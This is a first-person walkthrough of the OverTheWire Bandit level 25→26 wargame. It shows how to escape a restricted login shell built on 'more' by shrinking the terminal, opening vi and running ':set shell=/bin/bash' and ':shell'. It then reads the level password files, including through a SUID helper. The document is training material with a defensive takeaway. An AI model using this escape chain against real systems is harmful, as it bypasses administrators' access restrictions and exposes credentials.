# Bandit Level 25 → Level 26

## Level Goal

Logging in to `bandit26` from `bandit25` should be fairly easy… The shell for user `bandit26` is not `/bin/bash`, but something else. Find out what it is, how it works, and how to break out of it.

---

## Inspecting the Target Account

First, I checked the home directory of `bandit25` and found an SSH private key named `bandit26.sshkey`.

Next, I checked `/etc/passwd` to see the login shell assigned to `bandit26`:

```bash
grep bandit26 /etc/passwd
```

Output:

```text
bandit26:x:11026:11026:bandit26:/home/bandit26:/usr/bin/showtext
```

The default shell for `bandit26` is set to `/usr/bin/showtext` instead of standard interactive shells like `/bin/bash`.

I then checked the contents of `/usr/bin/showtext`:

```bash
cat /usr/bin/showtext
```

Output:

```bash
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

---

## Where I Got Stuck & Challenges

### 1. Immediate Session Disconnection
Whenever I ran `ssh -i bandit26.sshkey bandit26@127.0.0.1 -p 2220`, the command would run `more ~/text.txt`, reach the end of the text file immediately, hit `exit 0`, and disconnect my session before I could interact with it.

### 2. Terminal Window Autoscroll / Size Negotiation
I attempted to shrink my terminal window manually, but SSH negotiated standard terminal line heights upon connecting, causing `more` to output the entire file without pausing.

### 3. Loopback Connection Errors
Using `localhost` instead of `127.0.0.1` returned a connection block message stating that connections to `localhost` were restricted to conserve resources.

---

## The Solution Strategy

1. **Forcing `more` to Pause:** The `more` utility acts as an interactive text pager. If the terminal line height is smaller than the text being displayed, `more` pauses and waits for user input (showing `--More--`).
2. **Escaping to `vi` Editor:** While `more` is paused, pressing **`v`** automatically opens the file in the `vi` text editor.
3. **Spawning a Shell from `vi`:** Once inside `vi`, we can override the standard shell path to `/bin/bash` and invoke a shell directly from the editor's command mode.

---

## Execution

### Step 1: Force Terminal Line Height

To prevent `more` from auto-scrolling to the end of the file, I forced my shell session height to **3 rows** using `stty` before initiating SSH:

```bash
stty rows 3
```

### Step 2: Connect via SSH

Using `127.0.0.1` explicitly to avoid loopback restrictions:

```bash
ssh -i bandit26.sshkey bandit26@127.0.0.1 -p 2220
```

Because the window height was constrained to 3 lines, `more` paused at the bottom of the screen with `--More--(xx%)`.

### Step 3: Break Out to `vi`

While paused at `--More--`, I pressed:

```text
v
```

This successfully launched the `vi` editor interface.

### Step 4: Spawn a Bash Shell

Inside `vi`, I entered command mode (using `:`):

```text
:set shell=/bin/bash
```

And then executed the shell command:

```text
:shell
```

This dropped me into an interactive `/bin/bash` shell running as user **`bandit26`**.

### Step 5: Read Passwords & Reset Terminal

Once inside the `bandit26` shell, I reset the terminal dimensions to normal:

```bash
stty rows 24 cols 80
```

I then retrieved the password for `bandit26`:

```bash
cat /etc/bandit_pass/bandit26
```

And used the SUID binary in `bandit26`'s home directory to read the password for Level 27:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

---

## Commands Used

```bash
grep bandit26 /etc/passwd

cat /usr/bin/showtext

stty rows 3

ssh -i bandit26.sshkey bandit26@127.0.0.1 -p 2220

cat /etc/bandit_pass/bandit26

./bandit27-do cat /etc/bandit_pass/bandit27
```

---

## What I Learned

### 1. Restricted Shells & Custom Login Handlers
System accounts in Linux do not always use standard shells. Any executable script or binary specified in `/etc/passwd` serves as the user's entry point and controls the lifetime of the SSH session.

### 2. Escaping Pagers (`more` / `less`)
Text pagers like `more` and `less` often retain legacy interactive features (such as spawning editors via `v`), which allow users to escape constrained interface environments if the pager pauses.

### 3. Terminal Control (`stty`)
The `stty` utility can manipulate terminal driver settings locally, such as forcing window height parameters (`stty rows N`), overriding automated window size negotiations.

### 4. Editor Shell Spawning
Text editors like `vi` allow users to configure internal variables (`:set shell=...`) and launch child shell sub-processes (`:shell`), running with the privileges of the editor's current owner.

---

## Key Takeaway

> **Never use interactive utilities like `more` or `vi` as restricted login shells, as built-in editor escape commands allow users to spawn arbitrary sub-shells.**

Escape chain:

```text
stty rows 3
        ↓
ssh -i bandit26.sshkey bandit26@127.0.0.1 -p 2220
        ↓
more pauses (--More--)
        ↓
Press 'v' → Open vi editor
        ↓
:set shell=/bin/bash
        ↓
:shell
        ↓
Interactive bandit26 shell
```